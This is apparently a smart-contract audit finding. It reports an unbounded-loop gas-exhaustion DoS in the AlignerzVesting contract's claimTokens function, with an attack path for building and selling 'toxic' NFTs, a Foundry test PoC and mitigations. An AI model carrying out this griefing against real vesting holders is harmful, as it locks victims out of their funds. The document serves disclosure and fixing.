# [000896] Unbounded Vesting Flows Let Toxic NFTs Brick Claims via Gas-Exhaustion DoS
  
  ### Summary

Unbounded vesting flows per NFT will cause a permanent claim DoS for NFT holders as a malicious holder will merge/structure an NFT with thousands of flows and then transfer it, making `claimTokens` exhaust gas.

### Root Cause

In `protocol/src/contracts/vesting/AlignerzVesting.sol` the flow count per NFT is unbounded (merges append flows; splits replicate flows once fixed) and `claimTokens` linearly iterates over every flow in a single call, so sufficiently large flow arrays will exceed block gas and revert.

### Internal Pre-conditions

1. Attacker controls one or more vesting NFTs (from bids or rewards).
2. Attacker accumulates many NFTs or, once split is fixed, uses split to replicate flows; then uses `mergeTVS` to aggregate thousands of flows into a single NFT.
3. Attacker holds a gas budget typical of a user claim (~a few million gas).

### External Pre-conditions

none

### Attack Path

1. Attacker gathers many 1-flow NFTs (by claiming or buying) or, once the split bug is fixed, splits to multiply flows cheaply.
2. Attacker calls `mergeTVS` repeatedly to append all flows into one target NFT, pushing the flow count into the thousands.
3. Attacker transfers or sells the “toxic” NFT to a victim.
4. Victim calls `claimTokens` on the toxic NFT; the linear loop over all flows runs out of gas and reverts, bricking the claim.

### Impact

The NFT holder cannot claim their vested tokens; funds tied to that NFT become effectively unclaimable. The claim path exhausts available gas (OOG) due to the unbounded loop and consistently reverts, creating a griefing/liveness DoS and a practical loss of access to the vested balance for the affected holder.

### PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.29;

import "forge-std/Test.sol";
import {MockUSD} from "../src/MockUSD.sol";
import {AlignerzNFT} from "../src/contracts/nft/AlignerzNFT.sol";
import {AlignerzVesting} from "../src/contracts/vesting/AlignerzVesting.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @dev Harness to seed arbitrary reward flows without going through Merkle/claim flows
contract AlignerzVestingHarness is AlignerzVesting {
    function seedRewardFlows(
        uint256 projectId,
        uint256 nftId,
        IERC20 token,
        uint256 flows,
        uint256 vestingPeriod,
        uint256 startTime
    ) external {
        RewardProject storage p = rewardProjects[projectId];
        p.token = token;
        p.startTime = startTime;
        p.claimDeadline = startTime + 30 days;

        Allocation storage a = p.allocations[nftId];
        a.token = token;
        for (uint256 i; i < flows;) {
            a.amounts.push(1e6); // 1 token (MockUSD has 6 decimals)
            a.vestingPeriods.push(vestingPeriod);
            a.vestingStartTimes.push(startTime);
            a.claimedSeconds.push(0);
            a.claimedFlows.push(false);
            unchecked {
                ++i;
            }
        }
        allocationOf[nftId] = a;
    }
}

/// @notice Demonstrates that an NFT with too many flows becomes unclaimable (out of gas)
contract FlowExplosionDoSTest is Test {
    MockUSD internal tvs;
    AlignerzNFT internal nft;
    AlignerzVestingHarness internal vesting;
    address internal user = address(0xBEEF);

    function setUp() public {
        tvs = new MockUSD();
        nft = new AlignerzNFT("AlignerzNFT", "AZNFT", "https://nft.alignerz.bid/");

        vesting = new AlignerzVestingHarness();
        vesting.initialize(address(nft));

        // Vesting must be allowed to burn/mint to avoid ERC721A receiver reverts during claims
        nft.addMinter(address(vesting));

        // Treasury can be any non-zero address
        vesting.setTreasury(address(1));
    }

    function test_FlowExplosion_BlackholesClaims() public {
        // Prepare tokens for payouts
        uint256 flowsNormal = 1;
        uint256 flowsToxic = 2_000; // large enough to exceed a realistic gas cap
        uint256 amountPerFlow = 1e6; // 1 token with 6 decimals
        uint256 totalNeeded = (flowsNormal + flowsToxic) * amountPerFlow;
        tvs.transfer(address(vesting), totalNeeded);

        // Mint NFTs owned by this test user
        uint256 normalId = nft.mint(user);
        uint256 toxicId = nft.mint(user);

        uint256 projectId = 0;
        uint256 start = block.timestamp;
        uint256 vestingPeriod = 1; // 1 second vesting to make everything claimable

        // Seed flows directly
        vesting.seedRewardFlows(projectId, normalId, tvs, flowsNormal, vestingPeriod, start);
        vesting.seedRewardFlows(projectId, toxicId, tvs, flowsToxic, vestingPeriod, start);

        // Fast-forward so flows are fully claimable
        vm.warp(start + vestingPeriod + 1);

        // Sanity: a normal NFT can be claimed successfully
        vm.prank(user);
        vesting.claimTokens(projectId, normalId);

        // The toxic NFT iterates over too many flows and should fail under a realistic gas cap
        bytes memory data = abi.encodeWithSelector(vesting.claimTokens.selector, projectId, toxicId);
        vm.prank(user);
        (bool okToxic,) = address(vesting).call{gas: 3_000_000}(data);
        assertFalse(okToxic, "toxic NFT should exhaust gas and fail");
    }
}
```

Key points:
- Seeds a “normal” NFT with 1 flow and a “toxic” NFT with 2,000 flows via a harness.
- Warps time so all flows are claimable.
- Successfully claims the normal NFT.
- Attempts to claim the toxic NFT with a 3M gas cap; the low-level call returns `okToxic == false`, demonstrating gas exhaustion and an unclaimable NFT.


### Mitigation

- Enforce a hard cap on flows per NFT and reject merges/splits that exceed it.
- Add paginated/batched claiming (process flows in chunks) or aggregate identical flows to keep per-claim gas bounded.
- Consider per-flow-count limits or fees as a soft guard, but caps + pagination are safer.
  